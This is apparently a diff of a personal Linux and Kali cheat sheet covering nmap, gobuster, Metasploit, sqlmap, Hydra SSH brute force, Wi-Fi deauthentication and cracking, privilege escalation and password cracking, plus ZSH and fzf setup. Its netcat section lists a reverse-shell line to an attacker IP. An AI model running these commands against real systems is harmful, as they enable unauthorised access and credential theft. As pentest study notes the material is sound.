   whois <domain>                 Fetch domain registration details
-  hostname -I                    Displays all ips quick and fast ******
---------------------------------------------------------------------------------
-HTML FILES & WEB BROWSING FROM TERMINAL
---------------------------------------------------------------------------------
-
-  OPENING HTML FILES IN A BROWSER
-  --------------------------------
-
-  firefox file.html              Open a local HTML file in Firefox
-  chromium file.html             Open a local HTML file in Chromium
-  xdg-open file.html             Open with the system default browser
-
-  VIEWING RAW HTML CODE IN TERMINAL
-  ----------------------------------
-
-  cat file.html                  Print the entire HTML file contents to terminal
-  nano file.html                 Open and edit the HTML file in nano
-  vim file.html                  Open and edit the HTML file in vim
-  less file.html                 Scroll through the HTML file (q to quit)
-
-  RUNNING A LOCAL WEB SERVER
-  --------------------------
-
-  python3 -m http.server 8080    Serve current directory over HTTP on port 8080
-                                 Then open browser and go to: localhost:8080
-                                 Useful for hosting and testing local HTML files
-                                 without needing Apache or Nginx installed
-
-  OPENING WEBSITES FROM TERMINAL
-  --------------------------------
-
-  firefox https://google.com     Open a website in Firefox GUI browser
-  chromium https://google.com    Open a website in Chromium GUI browser
-
-  TERMINAL-ONLY BROWSERS (NO GUI NEEDED)
-  ---------------------------------------
-
-  These tools let you browse entirely inside the terminal with no desktop required.
-  Useful when working on a headless server or over SSH.
-
-  lynx https://google.com        Text-based browser — navigate fully in terminal
-  w3m https://google.com         Lightweight text browser with mouse support
-  elinks https://google.com      Feature-rich text browser with color support
-
-  Install if not present:
-  sudo apt install lynx
-  sudo apt install w3m
-  sudo apt install elinks
-
-  FETCHING & DOWNLOADING FROM TERMINAL
-  --------------------------------------
-
-  curl https://google.com        Fetch and dump raw HTML source to terminal
-  wget https://google.com        Download a webpage or file to current directory
-
-  curl is best for quickly viewing page source or sending custom HTTP requests.
-  wget is best for downloading files, pages, or entire websites to disk.
 
 --------------------------------------------------------------------------------
 SCANNING & ENUMERATION
 --------------------------------------------------------------------------------
 
-  NMAP SCANS
+  NMAP FLAGS
   ----------
+  -sn                    Ping sweep — find live hosts, no port scan
+  -sT                    TCP Connect Scan (full handshake, louder)
+  -sS                    SYN Scan (stealth, half-open)
+  -sU                    UDP Scan (slower than TCP)
+  -sV                    Version detection — identify software on open ports
+  -O                     OS detection
+  -A                     Aggressive — OS, version, scripts, traceroute
+  -p <port>              Scan specific port or range (e.g. -p 80 or -p 1-1000)
+  -p-                    Scan ALL 65535 ports
+  --open                 Only show open ports
+  -oN <file>             Save output in readable format
+  -oG <file>             Save output in greppable format
+  -T4                    Speed template (T1=slowest, T5=fastest)
+  -v / -vv               Verbose / very verbose output
+  --script <name>        Run a specific NSE script
 
-  nmap -sn 192.168.1.0/24               Ping sweep — discover live hosts on subnet
-  nmap -sT <IP>                         TCP Connect Scan (full handshake, louder)
-  nmap -sS <IP>                         SYN Scan (stealth scan, half-open)
-  nmap -sU <IP>                         UDP Scan
-  nmap -A <IP>                          Aggressive scan — OS detection, scripts, traceroute
+  NMAP EXAMPLES
+  -------------
+  nmap -sn 192.168.1.0/24               Ping sweep — discover live hosts
+  nmap -sS <IP>                         Stealth SYN scan
+  nmap -A <IP>                          Aggressive scan
+  nmap -sV 192.168.1.1 | grep open      Show only open ports
 
   WEB ENUMERATION
   ---------------
-
   nikto -h <IP>                         Web vulnerability scanner
   whatweb <URL>                         Identify web technologies and CMS
   gobuster dir -u <URL> -w <wordlist>   Directory and file brute-forcing
+
+  GOBUSTER FLAGS
+  --------------
+  dir                    Directory/file brute-force mode
+  -u <URL>               Target URL
+  -w <wordlist>          Wordlist to use
+  -t <number>            Threads (default 10)
+  -x <extensions>        File extensions to look for (e.g. -x php,html,txt)
+  -o <file>              Save output to a file
+  -q                     Quiet — only show results
 
 --------------------------------------------------------------------------------
 EXPLOITATION & ATTACKING
@@ -634,34 +502,57 @@ EXPLOITATION & ATTACKING
 
   METASPLOIT
   ----------
-
   msfconsole                     Start the Metasploit Framework
   search exploit <keyword>       Search for exploits by keyword
   use <exploit>                  Select an exploit module
-  set LHOST <IP>                 Set local (attacker) IP for reverse shell
-  set LPORT <port>               Set the listening port
+  set LHOST <IP>                 Set local (attacker) IP
+  set LPORT <port>               Set listening port
   exploit                        Run the selected exploit
 
   WEB ATTACKS
   -----------
-
   sqlmap -u <URL> --dbs          Automated SQL injection — enumerate databases
 
   BRUTE FORCE (HYDRA)
   -------------------
+  HYDRA FLAGS
+  -----------
+  -l <username>          Single known username
+  -L <file>              List of usernames from a file
+  -p <password>          Single known password
+  -P <file>              Wordlist of passwords
+  -t <number>            Parallel threads (e.g. -t 4)
+  -f                     Stop after first valid login found
+  -v / -V                Verbose / very verbose (shows every attempt)
+  -s <port>              Custom port if not default
+  -o <file>              Save found credentials to a file
 
+  HYDRA EXAMPLES
+  --------------
   hydra -l <user> -P <wordlist> <IP> ssh               Basic SSH brute force
-  hydra -l admin -P passlist.txt ssh://192.168.1.11 -t 4 -f    Known user attack
-  hydra -L users.txt -P passlist.txt ssh://192.168.1.11 -t 4 -f    Unknown user attack
+  hydra -l admin -P passlist.txt ssh://192.168.1.11 -t 4 -f    Known user
+  hydra -L users.txt -P passlist.txt ssh://192.168.1.11 -t 4 -f    Unknown user
 
-  (See HYDRA reference sheet for full options and flags)
+  NETCAT
+  ------
+  nc -lvnp <port>                          Listen for incoming connection
+  nc <attacker_IP> <port> -e /bin/bash     Reverse shell back to attacker
+
+  NETCAT FLAGS
+  ------------
+  -l                     Listen mode
+  -v                     Verbose
+  -n                     No DNS resolution — use IPs only
+  -p <port>              Specify port
+  -e <program>           Execute program on connect (e.g. -e /bin/bash)
+  -u                     UDP mode
 
 --------------------------------------------------------------------------------
 WIRELESS ATTACKS
 --------------------------------------------------------------------------------
 
-  airmon-ng start wlan0                              Enable monitor mode on adapter
-  airodump-ng wlan0mon                               Capture packets on wireless networks
+  airmon-ng start wlan0                              Enable monitor mode
+  airodump-ng wlan0mon                               Capture wireless packets
   aireplay-ng -0 5 -a <BSSID> wlan0mon              Deauthenticate clients (5 packets)
   aircrack-ng -w <wordlist> -b <BSSID> <capfile>    Crack captured Wi-Fi handshake
 
@@ -670,14 +561,8 @@ PRIVILEGE ESCALATION & POST-EXPLOITATION
 --------------------------------------------------------------------------------
 
   sudo -l                                            Check current sudo privileges
-  find / -perm -4000 2>/dev/null                     Find SUID binaries (potential privesc)
-  python -c 'import pty; pty.spawn("/bin/bash")'     Spawn a TTY shell (stabilise shell)
-
-  NETCAT
-  ------
-
-  nc -lvnp <port>                          Listen for incoming connection (attacker side)
-  nc <attacker_IP> <port> -e /bin/bash     Reverse shell back to attacker
+  find / -perm -4000 2>/dev/null                     Find SUID binaries
+  python -c 'import pty; pty.spawn("/bin/bash")'     Spawn a TTY shell
 
 --------------------------------------------------------------------------------
 PASSWORD CRACKING
@@ -685,16 +570,16 @@ PASSWORD CRACKING
 
   john --wordlist=<wordlist> <hashfile>              Crack hashes with John the Ripper
   hashcat -m 0 -a 0 <hashfile> <wordlist>           Crack hashes with Hashcat (MD5 mode)
-  hash-identifier                                    Identify the type of a hash
-  cewl -w <wordlist> -d 2 <URL>                     Generate wordlist from website content
-  crunch 8 8 abc123 -o wordlist.txt                 Generate custom wordlist (8 char, set: abc123)
+  hash-identifier                                    Identify hash type
+  cewl -w <wordlist> -d 2 <URL>                     Generate wordlist from website
+  crunch 8 8 abc123 -o wordlist.txt                 Generate custom wordlist (8 char)
 
 --------------------------------------------------------------------------------
 WIRESHARK & PACKET ANALYSIS
 --------------------------------------------------------------------------------
 
   wireshark &                    Launch Wireshark GUI in background
-  tshark -i wlan0                Capture packets via terminal on wlan0
+  tshark -i wlan0                Capture packets via terminal
   tcpdump -i eth0                Capture all traffic on eth0
   tcpdump -A -s0 port 80         Capture and display HTTP traffic in ASCII
 
@@ -704,16 +589,300 @@ FORENSICS & STEGANOGRAPHY
 
   binwalk -e <file>              Extract hidden/embedded data from a file
   strings <file>                 Extract human-readable strings from a binary
-  steghide extract -sf <file>    Extract hidden data from an image file
-  foremost -i <file> -o <dir>    Recover deleted/hidden files from a file/image
+  steghide extract -sf <file>    Extract hidden data from an image
+  foremost -i <file> -o <dir>    Recover deleted/hidden files
   autopsy                        Launch Autopsy — GUI digital forensics platform
+
+--------------------------------------------------------------------------------
+HTML FILES & WEB BROWSING FROM TERMINAL
+--------------------------------------------------------------------------------
+
+  OPENING HTML FILES IN A BROWSER
+  --------------------------------
+  firefox file.html              Open a local HTML file in Firefox
+  chromium file.html             Open in Chromium
+  xdg-open file.html             Open with system default browser
+
+  VIEWING RAW HTML IN TERMINAL
+  ----------------------------
+  cat file.html                  Print entire HTML file
+  nano file.html                 Edit in nano
+  vim file.html                  Edit in vim
+  less file.html                 Scroll through file
+
+  RUNNING A LOCAL WEB SERVER
+  --------------------------
+  python3 -m http.server 8080    Serve current directory over HTTP on port 8080
+                                 Then visit: localhost:8080
+
+  TERMINAL-ONLY BROWSERS (NO GUI)
+  --------------------------------
+  lynx https://google.com        Text-based browser
+  w3m https://google.com         Lightweight with mouse support
+  elinks https://google.com      Feature-rich with color support
+
+  Install if not present:
+    sudo apt install lynx w3m elinks
+
+  FETCHING & DOWNLOADING
+  ----------------------
+  curl https://google.com        Fetch and dump raw HTML to terminal
+  wget https://google.com        Download a file or webpage to disk
+  firefox https://google.com     Open URL in Firefox
+
+--------------------------------------------------------------------------------
+TERMINAL SHORTCUTS — KEYBOARD NAVIGATION
+--------------------------------------------------------------------------------
+
+  CURSOR MOVEMENT
+  ---------------
+  Ctrl + A        Jump to START of the line
+  Ctrl + E        Jump to END of the line
+  Alt  + B        Jump back ONE WORD
+  Alt  + F        Jump forward ONE WORD
+  Left / Right    Move one character at a time
+  Up / Down       Cycle through command history
+
+  DELETING
+  --------
+  Ctrl + U        Delete from cursor to START of line
+  Ctrl + K        Delete from cursor to END of line
+  Ctrl + W        Delete ONE WORD backward
+  Alt  + D        Delete ONE WORD forward
+  Backspace       Delete one character back
+
+  PASTE WHAT YOU JUST DELETED
+  ---------------------------
+  Ctrl + Y        "Yank" — paste the last thing you cut with Ctrl+U/K/W
+
+  SEARCH & REUSE OLD COMMANDS
+  ---------------------------
+  Ctrl + R        Search backward through command history interactively
+                  (type to search, Ctrl+R again for next match, Enter to run)
+  !!              Re-run the last command
+  !<text>         Re-run last command starting with <text>
+                  Example: !ssh  runs the last command that started with ssh
+
+  SCREEN & PROCESS CONTROL
+  ------------------------
+  Ctrl + L        Clear the screen (same as typing "clear")
+  Ctrl + C        Kill/interrupt the running command
+  Ctrl + Z        Suspend the running command
+                  (use "fg" to resume in foreground, "bg" for background)
+  Ctrl + D        Exit the current shell (same as "exit")
+  Tab             Auto-complete file/folder/command names
+  Tab Tab         Show ALL possible completions
+
+--------------------------------------------------------------------------------
+ZSH & OH MY ZSH
+--------------------------------------------------------------------------------
+
+  WHAT ZSH IS
+  -----------
+  ZSH is a shell — the program that runs in your terminal and interprets
+  your commands. More powerful than the default bash with better
+  autocomplete, globbing, and customization.
+
+  Install Oh My Zsh:
+    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+
+  Set ZSH as default shell:
+    chsh -s $(which zsh)
+
+  Config file location:
+    ~/.zshrc
+
+  Apply changes after editing:
+    source ~/.zshrc
+
+  USEFUL COMMANDS
+  ---------------
+  echo $SHELL                    Check what shell you are using
+  zsh --version                  Check ZSH version
+  nano ~/.zshrc                  Open config for editing
+  cp ~/.zshrc ~/Desktop/zshrc_backup    Back up config before editing
+  ls ~/.oh-my-zsh/themes/        See available Oh My Zsh themes
+
+  PLUGINS
+  -------
+  Add plugins to ~/.zshrc:
+    plugins=(git zsh-autosuggestions zsh-syntax-highlighting)
+
+  Install zsh-autosuggestions (shows history suggestions as you type):
+    git clone https://github.com/zsh-users/zsh-autosuggestions \
+    ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
+
+  Install zsh-syntax-highlighting (colors commands green/red as you type):
+    git clone https://github.com/zsh-users/zsh-syntax-highlighting \
+    ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
+
+  POWERLEVEL10K THEME
+  -------------------
+  Most popular Oh My Zsh theme — shows git status, icons, path, time.
+
+  Install:
+    git clone --depth=1 https://github.com/romkatv/powerlevel10k.git \
+    ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/themes/powerlevel10k
+
+  Set in ~/.zshrc:
+    ZSH_THEME="powerlevel10k/powerlevel10k"
+
+  Then: source ~/.zshrc  (setup wizard launches automatically)
+
+  ALIASES — SHORTCUT COMMANDS
+  ---------------------------
+  An alias makes the shell run one command when you type another.
+  You type "ls" → shell actually runs "lsd" (with icons).
+
+  Define in ~/.zshrc:
+    alias ls='lsd'
+    alias ll='lsd -la'
+    alias lt='lsd --tree'
+
+  View all active aliases:
+    alias
+
+  Remove an alias for the current session:
+    unalias ls
+
+  NOTE: Always reload with source ~/.zshrc after editing — not
+  source ~/.bashrc (that is bash only and won't apply zsh settings).
+
+--------------------------------------------------------------------------------
+LSD — LS WITH ICONS
+--------------------------------------------------------------------------------
+
+  lsd (LSDeluxe) is a drop-in ls replacement that adds file/folder
+  icons next to every entry. Requires a Nerd Font installed in
+  your terminal or icons show as boxes.
+
+  Install:
+    sudo dnf install lsd           (Fedora)
+    sudo apt install lsd           (Debian/Kali)
+
+  COMMANDS
+  --------
+  lsd                            List files with icons (replaces ls)
+  lsd -la                        Long format, all files, with icons
+  lsd --tree                     Tree view with icons
+  lsd -lh                        Human-readable sizes with icons
+  lsd -lt                        Sort by time, newest first
+  lsd --group-dirs first         Show directories before files
+
+  ALIAS IT TO REPLACE ls
+  ----------------------
+  Add to ~/.zshrc:
+    alias ls='lsd'
+    alias ll='lsd -la'
+    alias lt='lsd --tree'
+
+  Then reload:
+    source ~/.zshrc
+
+  NERD FONT REQUIRED
+  ------------------
+  Without a Nerd Font, icons render as boxes or question marks.
+
+  Install JetBrains Mono Nerd Font:
+    1. Download JetBrainsMono.zip from https://www.nerdfonts.com/font-downloads
+    2. Extract and move font files:
+         mkdir -p ~/.local/share/fonts/JetBrainsMono
+         mv ~/Downloads/*.ttf ~/.local/share/fonts/JetBrainsMono/
+    3. Rebuild font cache:
+         fc-cache -fv
+    4. Verify installed:
+         fc-list | grep JetBrains
+    5. Set font in your terminal to: JetBrainsMono Nerd Font Mono
+
+  fc-cache -fv explained:
+    fc-cache   = fontconfig cache tool — tells Linux about new fonts
+    -f         = force rescan everything even if unchanged
+    -v         = verbose — show output while running
+
+--------------------------------------------------------------------------------
+FZF — FUZZY FINDER
+--------------------------------------------------------------------------------
+
+  fzf is a command-line fuzzy finder. It lets you interactively search
+  through any list — command history, files, directories, processes —
+  by typing partial matches. The most useful upgrade to your terminal
+  workflow after ZSH.
+
+  Install:
+    sudo dnf install fzf           (Fedora)
+    sudo apt install fzf           (Debian/Kali)
+
+  Enable ZSH integration — add to ~/.zshrc:
+    source <(fzf --zsh)
+
+  Then reload:
+    source ~/.zshrc
+
+  HISTORY SEARCH — CTRL + R (UPGRADED)
+  -------------------------------------
+  After enabling fzf, Ctrl+R is replaced with fzf's fuzzy history search.
+
+  Before fzf:
+    Ctrl+R cycles through history one by one — hard to find old commands
+
+  After fzf:
+    Ctrl+R opens an interactive search panel
+    Type any part of a command → fzf filters matches in real time
+    Arrow keys to select, Enter to run it
+
+  Example:
+    Press Ctrl+R
+    Type: nmap 192         → shows all nmap commands with that IP
+    Type: docker ps        → shows all docker ps commands you've run
+    Select with arrows → Enter to run
+
+  FILE SEARCH — CTRL + T
+  ----------------------
+  Ctrl+T opens fzf to search files in the current directory.
+  Select a file → it gets inserted into your current command line.
+
+  Example:
+    nano [Ctrl+T]          → fuzzy search for a file → inserts path → nano opens it
+
+  DIRECTORY JUMP — ALT + C
+  ------------------------
+  Alt+C opens fzf to search directories and cd into them instantly.
+
+  STANDALONE USAGE
+  ----------------
+  fzf                            Open fzf on its own — search stdin
+  ls | fzf                       Fuzzy search through ls output
+  cat file.txt | fzf             Fuzzy search through any file
+  ps aux | fzf                   Fuzzy search running processes
+  history | fzf                  Fuzzy search command history manually
+
+  USEFUL COMBOS
+  -------------
+  kill -9 $(ps aux | fzf | awk '{print $2}')
+                                 Fuzzy pick a process and kill it
+
+  cat /etc/passwd | fzf          Fuzzy search through users
+
+  vim $(fzf)                     Fuzzy find a file and open in vim
+
+  SUMMARY — WHY USE FZF
+  ----------------------
+  Without fzf: Ctrl+R cycles history slowly, finding old commands is painful
+  With fzf:    Ctrl+R opens instant fuzzy search — find any command in seconds
+               Works on history, files, directories, and any piped input
 
 --------------------------------------------------------------------------------
 MISCELLANEOUS / USEFUL
 --------------------------------------------------------------------------------
 
   tor                            Start the Tor service for anonymised routing
-  proxychains nmap -sT <IP>      Route Nmap (or any command) through proxychains
-  sudo gunzip /usr/share/wordlists/rockyou.txt.gz    Decompress rockyou wordlist
+  proxychains nmap -sT <IP>      Route any command through proxychains
+  gedit <file>                   Open file in graphical text editor
+  chsh -s $(which zsh)           Set Zsh as default shell permanently
+  lpr <file>                     Print a file
 
 ================================================================================
+
+example > >(less) 2> >(tee errors.txt)    (example is a bash to give errors)
+
+tar cf - directory | tee >(ssh neo tar xf -) >(ssh 10.0.0.124 tar xf-) > /dev/null
